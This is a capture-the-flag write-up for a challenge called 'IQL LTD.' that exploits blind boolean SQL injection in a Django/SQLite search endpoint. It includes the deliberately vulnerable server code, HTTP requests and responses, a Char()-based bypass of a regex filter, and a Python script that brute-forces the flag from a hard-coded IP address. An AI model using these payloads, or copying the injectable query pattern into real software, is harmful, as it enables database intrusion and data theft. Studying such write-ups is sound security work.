# IQL LTD.
Find the names.

Flag format: CTF_BD{[0-9A-Za-z]+}

Author: Ashraful Islam <0xAgun>

# Overview

This Capture The Flag (CTF) challenge focuses on exploiting a SQL injection vulnerability in the 'quest1' parameter of an SQLite database. The challenge is designed to test your skills in identifying and exploiting common web application security flaws.

The goal of this challenge was to retrieve the flag stored in the database by exploiting the SQL injection vulnerability in the 'quest1' parameter.

![MIT License](https://i.imgur.com/fykxmtb.png)


# Exploitation

after browsing some while you can notice that if you come over next page and click on the submit button it'll just return a alert on the screen.
but after analyzing the request we can see the difference.

Request

```http
POST /search/ HTTP/1.1
Host: xx.xx.xxx.xxx:8000
Content-Length: 14
X-CSRFToken: CKuPRwpYszHiyS0RUKTFimRMTvFyV0fR1B8bxV4udXDV8ZllhPhmDoXOD4tM47IW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://xx.xx.xxx.xxx:8000
Referer: http://xx.xx.xxx.xxx:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=z1OwQzPGVy6NKhvExfyRvcgcUJYojhDf
Connection: close

{"quest1":"1"}
```

Response

```http
HTTP/1.1 500 Internal Server Error
Date: Mon, 09 Oct 2023 16:32:23 GMT
Server: WSGIServer/0.2 CPython/3.10.2
Content-Type: application/json
X-Frame-Options: DENY
Content-Length: 33
Vary: origin
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

{"error": "Something Went wrong"}
```


this is the normal request but if we change the  ```{"quest1":"2"}``` the response is different now ... its 200 Ok


now to check for sqli  {"quest1":"2 AND 1=1"} it got blocked 


```py
          if len(query) <= 2:
                try:
                    cursor.execute('SELECT No FROM polls_maths WHERE id='+pretty['quest1'])
                    row = cursor.fetchall()
                    print(row)
                    convert = int(row[0][0])
                    return JsonResponse({'results': convert})
                except Exception:
                    return JsonResponse({'error': "Something Went wrong"}, status=500)
            else:
                  patt = r"(select case)"
                                  try:
                                      search = re.search(patt, query, re.IGNORECASE)
                                      # search = re.compile(patt, query)
                                      if search:
                                          print("hello")
                                          pattern2 = r"\(.*,\d,\d\)='.'"
                                          search2 = re.search(pattern2, query, re.IGNORECASE)
                                          if search2:
                                              return JsonResponse({'error': 'Not Acceptable'}, status=406)
                                          else:
                                              cursor.execute('SELECT No FROM polls_maths WHERE id='+pretty['quest1'])
                                              row = cursor.fetchall()
                                              print(row[0][0])
                                              convert = int(row[0][0])
                                              return JsonResponse({'results': convert})
                                      else:
                                          return JsonResponse({'error': "Something Went wrong"}, status=500)
                                  except Exception as e:
                                      print(e)
                  
                                  return JsonResponse({'error': "Something Went wrong"}, status=500)
                  

```
here we can see that if our input is less then 2 or equal 2 if immidiately execute the query and if it's greater then 2 then it go to else block there it check if  (select case) is present or not on the input. If it's not present on the payload it retuns 500 error.

let's verify the injection with select case

```http
POST /search/ HTTP/1.1
Host: xx.xx.xxx.xxx:8000
Content-Length: 53
X-CSRFToken: CKuPRwpYszHiyS0RUKTFimRMTvFyV0fR1B8bxV4udXDV8ZllhPhmDoXOD4tM47IW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://xx.xx.xxx.xxx:8000
Referer: http://xx.xx.xxx.xxx:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=z1OwQzPGVy6NKhvExfyRvcgcUJYojhDf
Connection: close

{"quest1":"(SELECT CASE WHEN 1=1 THEN 2 ELSE 4 END)"}

```
the response


```http
HTTP/1.1 200 OK
Date: Tue, 10 Oct 2023 06:13:27 GMT
Server: WSGIServer/0.2 CPython/3.10.2
Content-Type: application/json
X-Frame-Options: DENY
Content-Length: 14
Vary: origin
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

{"results": 2}

```

it returns ok means it's vulnerable .

() is used for query selection if i dont use it's return error as waf is blocking AND operator.


to get the names collumn as given in the description we need to find the table name first i already know this so for the writeup i'll directly use the right column

```http
{"quest1":" (SELECT CASE WHEN EXISTS (SELECT 1 FROM sqlite_master WHERE type='table' AND tbl_name='users') THEN 2 ELSE 4 END)"}
```

and the result will be 200 OK

now it's time to get our flag


```http

{"quest1":"(select case when substr(names,1,1)='C' then 2 else 4 end from users limit 0,1)"}
```

after sending request it get's blocked by our waf ``` pattern2 = r"\(.*,\d,\d\)='.'"```

to bypass this we can use the Char() method of sql 
the final paylaod will look like this

```http

{"quest1":"(select case when substr(names,1,1)=Char(67) then 2 else 4 end from users limit 0,1)"}
```

now just use recursion and brute the flag


i have automated this using python 

```py

import requests



characters = [
    ('a', 97), ('b', 98), ('c', 99), ('d', 100), ('e', 101), ('f', 102), ('g', 103), ('h', 104), ('i', 105), ('j', 106), 
    ('k', 107), ('l', 108), ('m', 109), ('n', 110), ('o', 111), ('p', 112), ('q', 113), ('r', 114), ('s', 115), ('t', 116), 
    ('u', 117), ('v', 118), ('w', 119), ('x', 120), ('y', 121), ('z', 122), ('A', 65), ('B', 66), ('C', 67), ('D', 68), 
    ('E', 69), ('F', 70), ('G', 71), ('H', 72), ('I', 73), ('J', 74), ('K', 75), ('L', 76), ('M', 77), ('N', 78), ('O', 79), 
    ('P', 80), ('Q', 81), ('R', 82), ('S', 83), ('T', 84), ('U', 85), ('V', 86), ('W', 87), ('X', 88), ('Y', 89), ('Z', 90), 
    ('0', 48), ('1', 49), ('2', 50), ('3', 51), ('4', 52), ('5', 53), ('6', 54), ('7', 55), ('8', 56), ('9', 57), 
    ('!', 33), ('"', 34), ('#', 35), ('$', 36), ('%', 37), ('&', 38), ("'", 39), ('(', 40), (')', 41), ('*', 42), ('+', 43), 
    (',', 44), ('-', 45), ('.', 46), ('/', 47), (':', 58), (';', 59), ('<', 60), ('=', 61), ('>', 62), ('?', 63), ('@', 64), 
    ('[', 91), ('\\', 92), (']', 93), ('^', 94), ('_', 95), ('`', 96), ('{', 123), ('|', 124), ('}', 125), ('~', 126)
]



burp0_url = "http://45.76.177.238:8000/search/"
burp0_cookies = {"csrftoken": "z1OwQzPGVy6NKhvExfyRvcgcUJYojhDf"}
burp0_headers = {"X-CSRFToken": "gREtrhNf3Ikb9fe6N7uRVhVZnHw93QWAFIiP7GsLO6gOJmzAacSygj117gkncXpF", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://45.76.177.238:8000", "Referer": "http://45.76.177.238:8000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

res = ""

position = 1
while True:
    for x,y in characters:
        ch = str(y)
        burp0_json={"quest1": f"(select case when substr(names,{position},1)=Char({ch}) then 2 else 4 end from users limit 0,1)"}
        re1 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
        if re1.status_code == 200:
            position += 1
            res += x
            print(res)
            continue

```













